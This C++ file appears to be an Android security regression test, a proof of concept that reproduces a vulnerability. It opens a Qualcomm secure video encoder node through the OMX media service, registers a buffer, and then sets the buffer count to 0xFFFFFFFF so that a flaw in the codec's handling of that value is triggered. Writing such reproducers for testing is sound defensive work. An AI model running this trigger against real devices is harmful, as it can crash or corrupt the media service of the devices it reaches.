/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions vand
 * limitations under the License.
 */

#include <OMX_Component.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>

using namespace android;

#define PORT_INDEX_OUT 0
#define DEALER_MEMORY_SIZE 1486848
#define VIDEO_FRAME_HEIGHT 1280
#define VIDEO_FRAME_WIDTH 720
#define BUFFER_COUNT_DEFAULT 0x4
#define BUFFER_COUNT_TEST 0xFFFFFFFF
#define BUFFER_COUNT_MINIMUM 0x4
#define BUFFER_SIZE 49152
#define NAME_STRING "OMX.qcom.video.encoder.avc.secure"

class DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}
  virtual void onMessages(const std::list<omx_message> &) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

template <class T>
static void InitOMXParams(T *params) {
  memset(params, 0, sizeof(T));
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

int main() {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    ALOGI("mediaPlayerService == NULL");
    return EXIT_FAILURE;
  }

  sp<IOMX> service = mediaPlayerService->getOMX();
  if (service == NULL) {
    ALOGI("service == NULL");
    return EXIT_FAILURE;
  }

  IOMX::node_id node = 0;
  IOMX::buffer_id bufferId = 0;

  sp<MemoryDealer> dealer = new MemoryDealer(DEALER_MEMORY_SIZE);
  sp<IMemory> memory = dealer->allocate(DEALER_MEMORY_SIZE);

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  char *name = (char *)NAME_STRING;

  status_t err = service->allocateNode(name, observer, NULL, &node);
  if (err != OK) {
    ALOGI("%s node allocation fails", name);
    return EXIT_FAILURE;
  }

  OMX_PARAM_PORTDEFINITIONTYPE *params = (OMX_PARAM_PORTDEFINITIONTYPE *)malloc(
      sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
  InitOMXParams(params);

  params->nPortIndex = PORT_INDEX_OUT;
  params->format.video.nFrameHeight = VIDEO_FRAME_HEIGHT;
  params->format.video.nFrameWidth = VIDEO_FRAME_WIDTH;
  params->nBufferCountActual = BUFFER_COUNT_DEFAULT;
  params->nBufferSize = BUFFER_SIZE;
  params->nBufferCountMin = BUFFER_COUNT_MINIMUM;

  err = service->setParameter(node, OMX_IndexParamPortDefinition, params,
                              sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
  if (err != OK) {
    ALOGI("setParameter, err: %d", err);
    free(params);
    return EXIT_FAILURE;
  }

  err = service->useBuffer(node, PORT_INDEX_OUT, memory, &bufferId,
                           DEALER_MEMORY_SIZE);
  if (err != OK) {
    ALOGI("useBuffer, err: %d", err);
    free(params);
    return EXIT_FAILURE;
  }

  params->nBufferCountActual = BUFFER_COUNT_TEST;
  err = service->setParameter(node, OMX_IndexParamPortDefinition, params,
                              sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
  if (err != OK) {
    ALOGI("setParameter, change actualcount, err: %d", err);
    free(params);
    return EXIT_FAILURE;
  }

  err = service->freeNode(node);
  if (err != OK) {
    ALOGI("freeNode, err: %d", err);
    free(params);
    return EXIT_FAILURE;
  }

  free(params);
  return EXIT_SUCCESS;
}
